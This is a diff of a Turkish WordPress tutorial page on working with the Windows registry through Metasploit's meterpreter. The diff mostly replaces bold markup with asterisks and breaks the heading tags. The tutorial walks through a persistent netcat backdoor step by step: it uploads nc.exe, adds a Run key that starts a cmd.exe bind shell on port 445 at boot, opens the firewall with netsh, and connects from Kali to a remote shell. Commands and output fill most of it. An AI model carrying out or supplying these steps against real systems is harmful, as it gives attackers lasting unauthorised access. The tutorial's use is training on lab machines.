@@ -41,8 +41,8 @@ url: /tr/msf-registry-uzerinde-calisma/
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> reg
-Usage: reg <strong>[</strong>command<strong>]</strong> <strong>[</strong>options]
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  reg
+Usage: reg ***[*** command***]***  ***[*** options]
 
 Interact with the target machine's registry.
 
@@ -73,38 +73,38 @@ COMMANDS:
  
 
  
-<h2 class="wp-block-heading" id="kalıcı-netcat-arka-kapısı">Kalıcı Netcat Arka Kapısı</h2>
+<h2 class="wp-block-heading" id="kalıcı-netcat-arka-kapısı">Kalıcı Netcat Arka Kapısı
 <!-- /wp:heading -->
 
   Aşağıda adım adım gerçekleştireceğimiz örnekte, hedef sisteme&nbsp;<code>netcat</code>&nbsp;programını yerleştireceğiz. Registry ayarlarında işlemler yaparak&nbsp;<code>netcat</code>&nbsp;programının bilgisayar açıldığında otomatik başlamasını ayarlayacağız. Sistemde bulunan Firewall ayarlarının,&nbsp;<code>netcat</code>&nbsp;programına ve 445 numaralı porta müsaade etmesini sağlayacağız. 
  
 
-<!-- wp:heading {"level":3} -->
-<h3 class="wp-block-heading" id="ncexe-programını-yükleme">nc.exe Programını Yükleme</h3>
+
+<h3 class="wp-block-heading" id="ncexe-programını-yükleme">nc.exe Programını Yükleme
 <!-- /wp:heading -->
 
   Öncelikle hedef Windows işletim sisteminin içerisine&nbsp;<code>nc.exe</code>&nbsp;olarak bilinen netcat programını yükleyelim. Bunun için önceden bir şekilde meterpreter shell açmış olmalısınız. Bununla ilgili örnekleri önceki yazılarımızda belirtmiştik. Kali işletim sistemi içerisinde&nbsp;<code>/usr/share/windows-binaries/</code>&nbsp;klasöründe faydalı bir kaç programı bulabilirsiniz. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
-<strong>[</strong><strong>*</strong><strong>]</strong> uploading  : /tmp/nc.exe -&gt; C:\windows\system32
-<strong>[</strong><strong>*</strong><strong>]</strong> uploaded   : /tmp/nc.exe -&gt; C:\windows\system32nc.exe
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
+***[*** ******* ***]***  uploading  : /tmp/nc.exe -&gt; C:\windows\system32
+***[*** ******* ***]***  uploaded   : /tmp/nc.exe -&gt; C:\windows\system32nc.exe
 </code></pre>
 <!-- /wp:code -->
 
-<!-- wp:heading {"level":3} -->
-<h3 class="wp-block-heading" id="netcat-başlangıçta-otomatik-çalışsın">netcat Başlangıçta Otomatik Çalışsın</h3>
+
+<h3 class="wp-block-heading" id="netcat-başlangıçta-otomatik-çalışsın">netcat Başlangıçta Otomatik Çalışsın
 <!-- /wp:heading -->
 
   nc.exe programının işletim sisteminin her başladığında çalışması için Registry içinde&nbsp;<code>HKLM\software\microsoft\windows\currentversion\run</code>&nbsp;anahtarına bir değer oluşturmalısınız. Öncelikle, mevcut değerleri ve ayarları görelim. Ters \ işaretlerinin iki defa yazıldığına dikkat edin. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
 Enumerating: HKLM\software\microsoft\windows\currentversion\run
 
-  Values <strong>(</strong>3<strong>)</strong>:
+  Values ***(*** 3***)*** :
 
     VMware Tools
     VMware User Process
@@ -116,9 +116,9 @@ Enumerating: HKLM\software\microsoft\windows\currentversion\run
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'
 Successful set nc.
-meterpreter <strong>&gt;</strong> reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
+meterpreter ***&gt;***  reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
 Key: HKLM\software\microsoft\windows\currentversion\Run
 Name: nc
 Type: REG_SZ
@@ -126,20 +126,20 @@ Data: C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe
 </code></pre>
 <!-- /wp:code -->
 
-<!-- wp:heading {"level":3} -->
-<h3 class="wp-block-heading" id="firewall-ayarları">Firewall Ayarları</h3>
+
+<h3 class="wp-block-heading" id="firewall-ayarları">Firewall Ayarları
 <!-- /wp:heading -->
 
   Doğrudan Registry ayarlarından yapabileceğinizi gibi&nbsp;<code>netsh</code>&nbsp;komutu ile de firewall ayarlarını yapabilirsiniz. Kullanımı göstermek açısından, firewall ayarlarını komut satırından ayarlayalım. Bunun için Meterpreter komut satırından Windows komut satırına girelim. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> execute -f cmd -i
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  execute -f cmd -i
 Process 1604 created.
 Channel 1 created.
-Microsoft Windows XP <strong>[</strong>Version 5.1.2600]
-<strong>(</strong>C<strong>)</strong> Copyright 1985-2001 Microsoft Corp.
-C:\ <strong>&gt;</strong>
+Microsoft Windows XP ***[*** Version 5.1.2600]
+***(*** C***)***  Copyright 1985-2001 Microsoft Corp.
+C:\ ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
@@ -147,22 +147,22 @@ C:\ <strong>&gt;</strong>
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ <strong>&gt;</strong> netsh firewall show opmode
+<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ ***&gt;***  netsh firewall show opmode
 Netsh firewall show opmode
 
 Domain profile configuration:
 -------------------------------------------------------------------
-Operational mode                  <strong>=</strong> Enable
-Exception mode                    <strong>=</strong> Enable
+Operational mode                  ***=***  Enable
+Exception mode                    ***=***  Enable
 
-Standard profile configuration <strong>(</strong>current<strong>)</strong>:
+Standard profile configuration ***(*** current***)*** :
 -------------------------------------------------------------------
-Operational mode                  <strong>=</strong> Enable
-Exception mode                    <strong>=</strong> Enable
+Operational mode                  ***=***  Enable
+Exception mode                    ***=***  Enable
 
 Local Area Connection firewall configuration:
 -------------------------------------------------------------------
-Operational mode                  <strong>=</strong> Enable
+Operational mode                  ***=***  Enable
 </code></pre>
 <!-- /wp:code -->
 
@@ -170,7 +170,7 @@ Operational mode                  <strong>=</strong> Enable
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ <strong>&gt;</strong> netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
+<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ ***&gt;***  netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
 netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
 Ok.
 </code></pre>
@@ -180,10 +180,10 @@ Ok.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ <strong>&gt;</strong> netsh firewall show portopening
+<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ ***&gt;***  netsh firewall show portopening
 netsh firewall show portopening
 
-Port configuration <strong>for </strong>Domain profile:
+Port configuration ***for *** Domain profile:
 Port   Protocol  Mode     Name
 -------------------------------------------------------------------
 139    TCP       Enable   NetBIOS Session Service
@@ -191,7 +191,7 @@ Port   Protocol  Mode     Name
 137    UDP       Enable   NetBIOS Name Service
 138    UDP       Enable   NetBIOS Datagram Service
 
-Port configuration <strong>for </strong>Standard profile:
+Port configuration ***for *** Standard profile:
 Port   Protocol  Mode     Name
 -------------------------------------------------------------------
 445    TCP       Enable   Service Firewall
@@ -201,7 +201,7 @@ Port   Protocol  Mode     Name
 138    UDP       Enable   NetBIOS Datagram Service
 
 
-C:\ <strong>&gt;</strong>
+C:\ ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
@@ -211,13 +211,13 @@ C:\ <strong>&gt;</strong>
 <!-- wp:code -->
 <pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# nc -v 172.16.104.128 445
 172.16.104.128: inverse host lookup failed: Unknown server error : Connection timed out
-<strong>(</strong>UNKNOWN<strong>)</strong> <strong>[</strong>172.16.104.128] 445 <strong>(</strong>?<strong>)</strong> open
-Microsoft Windows XP <strong>[</strong>Version 5.1.2600]
-<strong>(</strong>C<strong>)</strong> Copyright 1985-2001 Microsoft Corp.
+***(*** UNKNOWN***)***  ***[*** 172.16.104.128] 445 ***(*** ?***)***  open
+Microsoft Windows XP ***[*** Version 5.1.2600]
+***(*** C***)***  Copyright 1985-2001 Microsoft Corp.
 
-C:\ <strong>&gt;</strong> dir
+C:\ ***&gt;***  dir
 dir
-Volume <strong>in </strong>drive C has no label.
+Volume ***in *** drive C has no label.
 Volume Serial Number is E423-E726
 
 Directory of C:\
@@ -238,10 +238,10 @@ My Documents
 Start Menu
 05/03/2009 01:25 AM 0 talltelnet.log
 05/03/2009 01:25 AM 0 talltftp.log
-4 File<strong>(</strong>s<strong>)</strong> 0 bytes
-6 Dir<strong>(</strong>s<strong>)</strong> 35,540,791,296 bytes free
+4 File***(*** s***)***  0 bytes
+6 Dir***(*** s***)***  35,540,791,296 bytes free
 
-C:\ <strong>&gt;</strong>
+C:\ ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
